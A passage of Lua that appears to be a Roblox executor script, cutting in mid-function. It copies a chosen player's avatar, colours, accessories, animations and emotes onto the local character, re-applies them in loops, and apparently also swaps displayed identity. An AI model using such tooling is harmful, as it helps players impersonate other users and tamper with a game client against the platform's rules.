        }
        for name, c3 in pairs(pmap) do
            if c3 then
                local part = char:FindFirstChild(name)
                if part and part:IsA("BasePart") then pcall(function() part.Color = c3 end) end
            end
        end
    end

    local function clearCopyChildren(char)
        for _, inst in ipairs(char:GetChildren()) do
            if isCopyClass(inst.ClassName) then pcall(function() inst:Destroy() end) end
        end
    end

    local function hasAnySourceBodyPart(model)
        for _, n in ipairs(BODY_PART_NAMES) do
            if model:FindFirstChild(n) then return true end
        end
        return false
    end

    local sizeToken = 0
    local function enforceBodySize(character)
        local cfg = CONFIG.changer
        if not cfg then return end
        if not character or not character.Parent then return end
        local hum = character:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local map = {
            BodyWidthScale=cfg.width, BodyDepthScale=cfg.depth, BodyHeightScale=cfg.height,
            HeadScale=cfg.head, BodyProportionScale=cfg.proportion, BodyTypeScale=cfg.bodyType,
        }
        for name, value in pairs(map) do
            if type(value) == "number" then
                local nv = hum:FindFirstChild(name)
                if nv and nv:IsA("NumberValue") and math.abs(nv.Value - value) > 0.001 then
                    pcall(function() nv.Value = value end)
                end
            end
        end
    end

    local function enforceBodySizeLoop(character)
        sizeToken = sizeToken + 1
        local myToken = sizeToken
        task.spawn(function()
            while myToken == sizeToken do
                task.wait(CONFIG.changer.enforceIntervalSeconds or 0.8)
                if myToken ~= sizeToken then return end
                local cur = LocalPlayer.Character
                character = (cur and cur.Parent) and cur or nil
                if character then enforceBodySize(character) end
            end
        end)
    end

    local function getTargetBodyScales(userId, targetDesc)
        local scales = {
            width = targetDesc and targetDesc.WidthScale or 1,
            depth = targetDesc and targetDesc.DepthScale or 1,
            height = targetDesc and targetDesc.HeightScale or 1,
            head = targetDesc and targetDesc.HeadScale or 1,
            proportion = targetDesc and targetDesc.ProportionScale or 0,
            bodyType = targetDesc and targetDesc.BodyTypeScale or 0,
        }
        local ok, tp = pcall(function() return Players:GetPlayerByUserId(userId) end)
        local tc = ok and tp and tp.Character
        local th = tc and tc:FindFirstChildOfClass("Humanoid")
        if not th then return scales end
        local function read(name, fb)
            local nv = th:FindFirstChild(name)
            if nv and nv:IsA("NumberValue") then return nv.Value end
            return fb
        end
        scales.width      = read("BodyWidthScale", scales.width)
        scales.depth      = read("BodyDepthScale", scales.depth)
        scales.height     = read("BodyHeightScale", scales.height)
        scales.head       = read("HeadScale", scales.head)
        scales.proportion = read("BodyProportionScale", scales.proportion)
        scales.bodyType   = read("BodyTypeScale", scales.bodyType)
        return scales
    end

    local function disconnectAppearanceHooks()
        if runtime.appearanceChildConn then
            runtime.appearanceChildConn:Disconnect()
            runtime.appearanceChildConn = nil
        end
        for i = #runtime.appearanceScaleConns, 1, -1 do
            local c = runtime.appearanceScaleConns[i]
            if c and c.Connected then c:Disconnect() end
            runtime.appearanceScaleConns[i] = nil
        end
    end

    local function applyAppearance(userId, char, applyToken)
        if applyToken ~= applySerialRef.value or not runtime.active then return end
        local model = getAppearanceModel(userId)
        if not model then return end
        if applyToken ~= applySerialRef.value or not runtime.active then model:Destroy(); return end

        clearCopyChildren(char)
        local sourceModel = model
        local humModel, bodyModel = nil, nil
        if not sourceModel:FindFirstChild("Head") or not hasAnySourceBodyPart(sourceModel) then
            local ok, created = pcall(function() return Players:CreateHumanoidModelFromUserId(userId) end)
            if ok and created then humModel = created; sourceModel = humModel end
        end
        if applyToken ~= applySerialRef.value then
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        local targetDesc = getTargetDescriptionCached(userId)
        CONFIG.changer.targetScales = getTargetBodyScales(userId, targetDesc)
        local bodyApplied = applyBodyFromDescription(targetDesc, char)
        task.wait()

        local postDesc = nil
        if bodyApplied then postDesc = snapshotColors(char) end
        local delayedSkin = nil
        if postDesc and postDesc.bodyColors then
            delayedSkin = { bodyColors = postDesc.bodyColors:Clone(), partColors = {} }
            for k, v in pairs(postDesc.partColors or {}) do delayedSkin.partColors[k] = v end
        end

        if applyToken ~= applySerialRef.value then
            destroyColorSnapshot(postDesc); destroyColorSnapshot(delayedSkin)
            if bodyModel then bodyModel:Destroy() end
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        if bodyApplied and not bodyModel then
            local okB, created = pcall(function() return Players:CreateHumanoidModelFromUserId(userId) end)
            if okB and created then bodyModel = created end
        end

        local bodySource = bodyModel or sourceModel
        local desiredFace = resolveFaceTexture(userId, bodySource, targetDesc)
        local sourceSizeMap = buildSourcePartSizeMap(bodySource)
        local charPartMap = buildBasePartMap(char)
        local carrier = buildAttachmentCarrierMap(charPartMap)

        for _, partName in ipairs(BODY_PART_NAMES) do
            if bodyApplied then
                if partName == "Head" then applyFaceTexture(char, desiredFace) end
            else
                local src = bodySource:FindFirstChild(partName) or sourceModel:FindFirstChild(partName)
                local dst = char:FindFirstChild(partName)
                if src and dst then
                    dst.Transparency = src.Transparency
                    local sm = src:FindFirstChildOfClass("SpecialMesh")
                    local dm = dst:FindFirstChildOfClass("SpecialMesh")
                    if sm then
                        if not dm then dm = sm:Clone(); dm.Parent = dst
                        else dm.MeshId = sm.MeshId; dm.TextureId = sm.TextureId; dm.Scale = sm.Scale; dm.Offset = sm.Offset end
                    elseif dm then dm:Destroy() end
                    pcall(function()
                        if src:IsA("MeshPart") and dst:IsA("MeshPart") then
                            dst.MeshId = src.MeshId; dst.TextureID = src.TextureID
                        end
                    end)
                    for _, att in ipairs(src:GetChildren()) do
                        if att:IsA("Attachment") then
                            local ex = dst:FindFirstChild(att.Name)
                            if ex then ex.Position = att.Position; ex.Orientation = att.Orientation
                            else att:Clone().Parent = dst end
                        end
                    end
                    if partName == "Head" then applyFaceTexture(char, desiredFace) end
                end
            end
        end

        if applyToken ~= applySerialRef.value then
            destroyColorSnapshot(postDesc)
            if bodyModel then bodyModel:Destroy() end
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        for _, inst in ipairs(sourceModel:GetChildren()) do
            if shouldCloneClass(inst.ClassName) then
                if not (bodyApplied and inst.ClassName == "CharacterMesh") then
                    local clone = inst:Clone()
                    clone.Parent = char
                    if isAccessoryClass(clone.ClassName) then
                        scaleAccessoryOnce(clone, char, sourceSizeMap, charPartMap, carrier)
                    end
                end
            end
        end

        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then pcall(function() hum:BuildRigFromAttachments() end) end

        if applyToken ~= applySerialRef.value then
            destroyColorSnapshot(postDesc); destroyColorSnapshot(delayedSkin)
            if bodyModel then bodyModel:Destroy() end
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        applyColors(targetDesc, char, bodySource, postDesc)
        destroyColorSnapshot(postDesc)
        applyFaceTexture(char, desiredFace)
        runtime.colorSnapshot = snapshotColors(char)
        if env then env.__CopyOutfitColorSnapshot = runtime.colorSnapshot end
        enforceBodySize(char)

        task.defer(function()
            for _, dt in ipairs({0.1, 0.28, 0.55}) do
                task.wait(dt)
                if applyToken ~= applySerialRef.value then destroyColorSnapshot(delayedSkin); return end
                if not char.Parent then destroyColorSnapshot(delayedSkin); return end
                if delayedSkin then
                    if delayedSkin.bodyColors then
                        local okC, bcC = pcall(function() return delayedSkin.bodyColors:Clone() end)
                        if okC and bcC then
                            pcall(function()
                                local cur = char:FindFirstChildOfClass("BodyColors")
                                if cur then cur:Destroy() end
                                bcC.Parent = char
                            end)
                        end
                    end
                    for partName, brick in pairs(delayedSkin.partColors or {}) do
                        local part = char:FindFirstChild(partName)
                        if part and part:IsA("BasePart") and brick then
                            pcall(function() part.BrickColor = brick end)
                        end
                    end
                    applyColors(nil, char, nil, delayedSkin)
                else
                    applyColors(targetDesc, char, nil, nil)
                end
                enforceBodySize(char)
            end
            destroyColorSnapshot(delayedSkin)
        end)

        disconnectAppearanceHooks()
        runtime.appearanceChildConn = char.ChildAdded:Connect(function(child)
            if isAccessoryClass(child.ClassName) then
                task.defer(function()
                    if applyToken ~= applySerialRef.value or not char.Parent then return end
                    local lm = buildBasePartMap(char)
                    local lc = buildAttachmentCarrierMap(lm)
                    scaleAccessoryOnce(child, char, sourceSizeMap, lm, lc)
                end)
            elseif child.Name == "Head" or child:IsA("Decal") then
                task.defer(function()
                    if applyToken ~= applySerialRef.value or not char.Parent then return end
                    applyFaceTexture(char, desiredFace)
                    local h = char:FindFirstChildOfClass("Humanoid")
                    if h then pcall(function() h:BuildRigFromAttachments() end) end
                end)
            end
        end)

        if bodyModel then bodyModel:Destroy() end
        if humModel then humModel:Destroy() end
        model:Destroy()
    end

    local animState = { active=false, folderBackup={} }

    local function resolveAnimId(preset, slot)
        if type(preset) ~= 'string' or preset == '' then return nil end
        if preset:match('^%d+$') then return 'rbxassetid://'..preset end
        if preset:sub(1,13) == 'rbxassetid://' then return preset end
        local pack = ANIM_PRESETS[preset]; if not pack then return nil end
        local id = pack[slot]; if not id then return nil end
        if id:sub(1,13) == 'rbxassetid://' then return id end
        if id:match('^%d+$') then return 'rbxassetid://'..id end
        return nil
    end

    local function backupFolder(folder)
        for _, child in ipairs(folder:GetChildren()) do
            if child:IsA('Animation') and animState.folderBackup[child] == nil then
                animState.folderBackup[child] = child.AnimationId
            end
        end
    end

    local function applyAnims(character)
        local cfg = shared.gravity['Char'] and shared.gravity['Char']['Animations']
        if not cfg or cfg['Enabled'] == false then return end
        local animate = character:FindFirstChild('Animate'); if not animate then return end
        local hum = character:FindFirstChildOfClass('Humanoid'); if not hum then return end

        for slot, info in pairs(ANIM_FOLDER_MAP) do
            local preset = cfg[slot]
            if preset then
                local id = resolveAnimId(preset, slot)
                if id then
                    local folder = animate:FindFirstChild(info.Folder)
                    if folder then
                        backupFolder(folder)
                        for _, childName in ipairs(info.Children) do
                            local anim = folder:FindFirstChild(childName)
                            if anim and anim:IsA('Animation') then anim.AnimationId = id end
                        end
                    end
                end
            end
        end
        pcall(function() animate.Disabled = true end)
        task.wait()
        pcall(function() animate.Disabled = false end)
        for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
            pcall(function() track:Stop(0) end)
        end
    end

    local function restoreAnims(character)
        local animate = character and character:FindFirstChild('Animate'); if not animate then return end
        for anim, orig in pairs(animState.folderBackup) do
            if anim and anim.Parent then pcall(function() anim.AnimationId = orig end) end
        end
        animState.folderBackup = {}
        pcall(function() animate.Disabled = true end)
        task.wait()
        pcall(function() animate.Disabled = false end)
    end

    local emoteState = {
        active = Cfg['Enabled'] == true,
        targetInput = CONFIG.target,
        currentUserId = nil,
        applyToken = 0,
        connections = {},
        emoteCache = {},
        cacheTtlSeconds = 20,
    }

    local function deepCopyTable(value, seen)
        if type(value) ~= "table" then return value end
        seen = seen or {}
        if seen[value] then return seen[value] end
        local out = {}
        seen[value] = out
        for k, v in pairs(value) do
            out[deepCopyTable(k, seen)] = deepCopyTable(v, seen)
        end
        return out
    end

    local function getEmoteDataFromDescription(desc)
        if not desc then return nil end
        local emotes, equipped = nil, nil
        if type(desc.GetEmotes) == "function" then
            local ok, v = pcall(function() return desc:GetEmotes() end)
            if ok and type(v) == "table" then emotes = deepCopyTable(v) end
        end
        if type(desc.GetEquippedEmotes) == "function" then
            local ok, v = pcall(function() return desc:GetEquippedEmotes() end)
            if ok and type(v) == "table" then equipped = deepCopyTable(v) end
        end
        if emotes == nil then
            local ok, v = pcall(function() return desc.Emotes end)
            if ok and type(v) == "table" then emotes = deepCopyTable(v) end
        end
        if equipped == nil then
            local ok, v = pcall(function() return desc.EquippedEmotes end)
            if ok and type(v) == "table" then equipped = deepCopyTable(v) end
        end
        if type(emotes) ~= "table" then emotes = {} end
        if type(equipped) ~= "table" then equipped = {} end
        return { emotes = emotes, equipped = equipped }
    end

    local function hasAnyTableEntries(v)
        return type(v) == "table" and next(v) ~= nil
    end

    local function hasUsableEmotePayload(d)
        if type(d) ~= "table" then return false end
        return hasAnyTableEntries(d.emotes) or hasAnyTableEntries(d.equipped)
    end

    local function getEmoteDataFromLivePlayer(userId)
        local ok, plr = pcall(function() return Players:GetPlayerByUserId(userId) end)
        if not ok or not plr then return nil end
        local char = plr.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return nil end
        local ok2, desc = pcall(function() return hum:GetAppliedDescription() end)
        if not ok2 or not desc then return nil end
        local data = getEmoteDataFromDescription(desc)
        pcall(function() desc:Destroy() end)
        return data
    end

    local function getEmoteDataFromUserId(userId)
        local entry = emoteState.emoteCache[userId]
        if entry and entry.data and (os.clock() - (entry.timestamp or 0) <= emoteState.cacheTtlSeconds) then
            return { emotes = deepCopyTable(entry.data.emotes), equipped = deepCopyTable(entry.data.equipped) }
        end
        local data = nil
        local desc = getTargetDescriptionCached(userId)
        if desc then
            data = getEmoteDataFromDescription(desc)
            pcall(function() desc:Destroy() end)
        end
        if not hasUsableEmotePayload(data) then
            data = getEmoteDataFromLivePlayer(userId)
        end
        if not data or not hasUsableEmotePayload(data) then return nil end
        emoteState.emoteCache[userId] = { data = data, timestamp = os.clock() }
        return data
    end

    local function setEmoteDataOnDescription(desc, emoteData)
        if not desc or not emoteData then return false end
        local applied = false
        if hasAnyTableEntries(emoteData.emotes) then
            local ok = pcall(function() desc:SetEmotes(deepCopyTable(emoteData.emotes)) end)
            applied = applied or ok
        end
        if hasAnyTableEntries(emoteData.equipped) then
            local ok = pcall(function() desc:SetEquippedEmotes(deepCopyTable(emoteData.equipped)) end)
            applied = applied or ok
        end
        return applied
    end

    local function applyScaleValuesToDescription(desc, scales)
        if not desc or not scales then return end
        desc.HeightScale = scales.height
        desc.WidthScale = scales.width
        desc.DepthScale = scales.depth
        desc.HeadScale = scales.head
        desc.BodyTypeScale = scales.bodyType
        desc.ProportionScale = scales.proportion
    end

    local function getCurrentScaleValues(humanoid)
        if not humanoid then return nil end
        local function read(name, fb)
            local nv = humanoid:FindFirstChild(name)
            return (nv and nv:IsA("NumberValue") and nv.Value) or fb
        end
        local ok, desc = pcall(function() return humanoid:GetAppliedDescription() end)
        return {
            height     = read("BodyHeightScale",     ok and desc and desc.HeightScale     or 1),
            width      = read("BodyWidthScale",      ok and desc and desc.WidthScale      or 1),
            depth      = read("BodyDepthScale",      ok and desc and desc.DepthScale      or 1),
            head       = read("HeadScale",           ok and desc and desc.HeadScale       or 1),
            bodyType   = read("BodyTypeScale",       ok and desc and desc.BodyTypeScale   or 0),
            proportion = read("BodyProportionScale", ok and desc and desc.ProportionScale or 0),
        }
    end

    local function restoreColorsSafely(char, snap)
        if not snap then return end
        if snap.bodyColors then
            local src = snap.bodyColors
            local ok, clone = pcall(function() return src:Clone() end)
            if ok and clone then
                local cur = char:FindFirstChildOfClass("BodyColors")
                if cur then pcall(function() cur:Destroy() end) end
                pcall(function() clone.Parent = char end)
            end
        end
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("BasePart") then
                local s = snap.partColors[c.Name]
                if s then c.BrickColor = s end
            end
        end
        task.defer(function()
            task.wait(0.06)
            if char and char.Parent then
                for _, c in ipairs(char:GetChildren()) do
                    if c:IsA("BasePart") then
                        local s = snap.partColors[c.Name]
                        if s then c.BrickColor = s end
                    end
                end
            end
        end)
        task.defer(function()
            task.wait(0.2)
            if char and char.Parent then
                for _, c in ipairs(char:GetChildren()) do
                    if c:IsA("BasePart") then
                        local s = snap.partColors[c.Name]
                        if s then c.BrickColor = s end
                    end
                end
            end
        end)
    end

    local function applyEmotesToHumanoid(humanoid, emoteData)
        if not humanoid or not emoteData then return false end
        if not hasUsableEmotePayload(emoteData) then return false end
        local char = humanoid.Parent
        local snap = snapshotColors(char)
        local scales = getCurrentScaleValues(humanoid)
        local liveDesc = humanoid:FindFirstChildOfClass("HumanoidDescription")
            or humanoid:FindFirstChild("HumanoidDescription")
        if liveDesc and setEmoteDataOnDescription(liveDesc, emoteData) then
            destroyColorSnapshot(snap)
            task.defer(function()
                if not emoteState.active or not liveDesc.Parent then return end
                setEmoteDataOnDescription(liveDesc, emoteData)
            end)
            return true
        end
        local ok, cur = pcall(function() return humanoid:GetAppliedDescription() end)
        if not ok or not cur then destroyColorSnapshot(snap); return false end
        if not setEmoteDataOnDescription(cur, emoteData) then
            destroyColorSnapshot(snap)
            pcall(function() cur:Destroy() end)
            return false
        end
        applyScaleValuesToDescription(cur, scales)
        if humanoid.ApplyDescriptionClientServer then
            local okC = pcall(function() humanoid:ApplyDescriptionClientServer(cur) end)
            if okC then
                restoreColorsSafely(char, snap)
                pcall(function() cur:Destroy() end)
                return true
            end
        end
        local okA = pcall(function() humanoid:ApplyDescription(cur) end)
        restoreColorsSafely(char, snap)
        pcall(function() cur:Destroy() end)
        return okA
    end

    local function mimicEmotesFromUserId(userId)
        if not emoteState.active then return false end
        local n = tonumber(userId); if not n then return false end
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return false end
        emoteState.applyToken = emoteState.applyToken + 1
        local tk = emoteState.applyToken
        local data = getEmoteDataFromUserId(n)
        if not data then return false end
        if tk ~= emoteState.applyToken or not emoteState.active then return false end
        local ok = false
        for attempt = 1, 3 do
            ok = applyEmotesToHumanoid(hum, data)
            if ok then break end
            if attempt < 3 then task.wait(0.12) end
        end
        if ok then emoteState.currentUserId = n end
        return ok
    end

    local function mimicEmotesFromTarget(target)
        if not emoteState.active then return false end
        local uid = resolveUserToId(target)
        if not uid then return false end
        emoteState.targetInput = target
        return mimicEmotesFromUserId(uid)
    end

    local function reapplyEmotes()
        if emoteState.currentUserId then
            return mimicEmotesFromUserId(emoteState.currentUserId)
        end
        return mimicEmotesFromTarget(emoteState.targetInput or CONFIG.target)
    end

    local function emoteCleanup()
        if not emoteState.active then return end
        emoteState.active = false
        emoteState.applyToken = emoteState.applyToken + 1
        for i = #emoteState.connections, 1, -1 do
            local c = emoteState.connections[i]
            emoteState.connections[i] = nil
            if c and c.Connected then pcall(function() c:Disconnect() end) end
        end
        emoteState.emoteCache = {}
    end

    local function apply(userId)
        if not runtime.active then return end
        if not (shared.gravity['Char'] and shared.gravity['Char']['Enabled']) then return end
        local char = LocalPlayer.Character
        if not char then return end
        runtime.applySerial = runtime.applySerial + 1
        local thisApply = runtime.applySerial
        applySerialRef.value = thisApply
        runtime.currentUserId = userId
        disconnectAppearanceHooks()
        startGuiIdentity(userId, thisApply)
        task.spawn(function()
            if not runtime.active or thisApply ~= applySerialRef.value then return end
            applyAppearance(userId, char, thisApply)
            enforceBodySizeLoop(char)
            task.wait(0.35)
            if thisApply == applySerialRef.value and runtime.active then
                mimicEmotesFromUserId(userId)
            end
        end)
    end

    local Connections = {}
    local function TrackConn(c) Connections[#Connections+1] = c; return c end

    local function onSpawn(spawnedChar)
        task.wait(0.5)
        if not runtime.active then return end
        if not spawnedChar.Parent then return end
        local uid = runtime.currentUserId or resolveUserToId(CONFIG.target)
        if not uid then return end
        apply(uid)
        if animState.active then
            task.wait(0.35)
            if spawnedChar.Parent then applyAnims(spawnedChar) end
        end
        if emoteState.active then
            task.wait(0.35)
            if spawnedChar.Parent then reapplyEmotes() end
        end
    end

    local function Start()
        runtime.active = true
        animState.active = true

        local uid = resolveUserToId(CONFIG.target)
        if not uid then warn('[gravity Char] could not resolve target:', CONFIG.target) end

        if LocalPlayer.Character then task.spawn(onSpawn, LocalPlayer.Character) end
        TrackConn(LocalPlayer.CharacterAdded:Connect(function(c) task.spawn(onSpawn, c) end))

        local _avBodyLast = 0
        TrackConn(RunService.Heartbeat:Connect(function()
            local cfg = shared.gravity['Char']
            if not cfg or not cfg['Enabled'] then return end
            local now = os.clock()
            if now - _avBodyLast < 0.5 then return end
            _avBodyLast = now
            local spawnedChar = LocalPlayer.Character
            if not spawnedChar then return end
            local hum = spawnedChar:FindFirstChildOfClass('Humanoid')
            if hum then enforceBodySize(spawnedChar) end
            if animState.active then
                local animate = spawnedChar:FindFirstChild('Animate')
                local idleFolder = animate and animate:FindFirstChild('idle')
                local first = idleFolder and idleFolder:FindFirstChild('Animation1')
                local wanted = cfg['Animations'] and resolveAnimId(cfg['Animations']['Idle'], 'Idle')
                if first and wanted and first.AnimationId ~= wanted then
                    applyAnims(spawnedChar)
                end
            end
        end))

        TrackConn(RunService.Heartbeat:Connect(function()
            if not emoteState.active then return end
            local cfg = shared.gravity['Char']
            if not cfg or not cfg['Enabled'] then return end
            if not emoteState._nextPulse or os.clock() >= emoteState._nextPulse then
                emoteState._nextPulse = os.clock() + 2
                local spawnedChar = LocalPlayer.Character
                if spawnedChar and spawnedChar:FindFirstChildOfClass("Humanoid") then
                    reapplyEmotes()
                end
            end
        end))

        task.defer(function()
            if uid then
                task.wait(0.6)
                mimicEmotesFromUserId(uid)
            end
        end)
    end

    local function Cleanup()
        runtime.active = false
        animState.active = false
        sizeToken = sizeToken + 1
        for i = #Connections, 1, -1 do
            local c = Connections[i]; Connections[i] = nil
            if c and c.Connected then pcall(function() c:Disconnect() end) end
        end
        disconnectAppearanceHooks()
        restoreGuiIdentity()
        clearInspectTarget()
        if LocalPlayer.Character then pcall(restoreAnims, LocalPlayer.Character) end
        destroyColorSnapshot(runtime.colorSnapshot); runtime.colorSnapshot = nil
        if env and env.__CopyOutfitColorSnapshot then
            destroyColorSnapshot(env.__CopyOutfitColorSnapshot)
            env.__CopyOutfitColorSnapshot = nil
        end
        emoteCleanup()
        clearAvatarCaches()
    end

    getgenv().avatar_cleanup = Cleanup

    if env then
        env.OutfitCopy = {
            SetTarget = function(newTarget)
                local n = resolveUserToId(newTarget); if not n then return end
                runtime.currentUserId = n
                apply(n)
            end,
            Reapply = function()
                local n = runtime.currentUserId or resolveUserToId(CONFIG.target)
                if n then apply(n) end
            end,
            Cleanup = Cleanup,
        }
    end

    Start()
end
